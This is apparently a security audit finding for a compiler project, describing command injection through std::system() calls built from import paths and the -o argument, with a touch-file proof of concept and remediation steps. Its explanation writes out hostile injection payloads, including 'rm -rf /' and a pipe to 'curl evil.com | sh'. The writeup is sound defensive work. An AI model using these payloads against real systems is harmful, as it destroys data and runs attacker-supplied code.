---
title: Command Injection via std::system()
tags: [command-injection, system, shell, critical, main.cpp]
sourceRefs: [src/main.cpp]
lastReviewed: 2026-11-21
---

# Command Injection via `std::system()`

## Severity: Critical

## Location

`src/main.cpp`, inside the `scanImports` lambda and the compile/link branches:

| Line | Command built | Tainted input |
|------|---------------|---------------|
| 135 | `./main --emit-obj --no-main -o <importedObj> <path>` | `path` from `import 'path'` statement |
| 124 | `objcopy --strip-symbol main <importedObj>` | `importedObj` derived from import path basename |
| 127 | `objcopy --redefine-sym module_init=<mod>_module_init <importedObj>` | `modName` + `importedObj` from import path |
| 140 | `objcopy --strip-symbol main <importedObj>` | same (cached path) |
| 143 | `objcopy --redefine-sym module_init=<mod>_module_init <importedObj>` | same (cached path) |
| 204 | `cc -shared <objFile> -o <outFile>` | `-o` CLI argument |
| 221 | `cc -no-pie <objs> <objFile> src/at_runtime.cpp -o <outFile>` | `-o` CLI argument + imported object paths |

## How it works

Each command string is passed verbatim to `std::system()`, which invokes `/bin/sh -c <string>`. Any shell metacharacter in the interpolated input is interpreted by the shell:

- `import 'legit.at; rm -rf / #.at'` → the `;` terminates the `./main` command and runs `rm -rf /`.
- `import 'legit.at | curl evil.com | sh #.at'` → pipes through attacker-controlled download/exec.
- `./main -o '/tmp/evil; touch /pwned .o'` → the `-o` value injects into the link command.

## Why interpreter mode is also affected

`scanImports(ast)` is called unconditionally after semantic analysis, before the `compileMode`/interpreter branch. It spawns `./main --emit-obj ...` for every `import '...'` statement — even when the user only intended to *interpret* the file. So an attacker need only get a victim to compile or interpret a source file containing a malicious `import` statement.

## Proof-of-concept concept

Create `poc.at`:
```
import '; touch /tmp/pwned_command_injection; #.at'
x : int = 1;
```
Run `./main poc.at` (interpreter mode) or `./main --compile poc.at`. The `std::system(importCmd)` line executes `./main --emit-obj --no-main -o /tmp/.o '; touch /tmp/pwned_command_injection; #.at'` → shell runs `touch /tmp/pwned_command_injection`.

## Remediation

1. Replace every `std::system(...)` with an `execvp`-style call using an `argv` array (no shell). E.g. `execvp("./main", {"./main", "--emit-obj", "--no-main", "-o", importedObj, path}, ...)`.
2. Validate all path inputs: allow only safe characters (`A-Za-z0-9._/-`), reject shell metacharacters (`; | & $ ` ` " ' < > ( ) { } [ ] \\`) and absolute paths unless explicitly intended.
3. Never derive command arguments from untrusted import paths; canonicalize and confine to an allowed directory.
4. Consider dropping privileges / sandboxing the compiler (seccomp, container, or dedicated unprivileged user).

## Related

- [[concepts/path-traversal-arbitrary-file]] — import path also enables arbitrary file read/write.
- [[concepts/ffi-object-import]] — imported ELF objects are linked/dlopened, compounding injection impact.
- [[findings]].
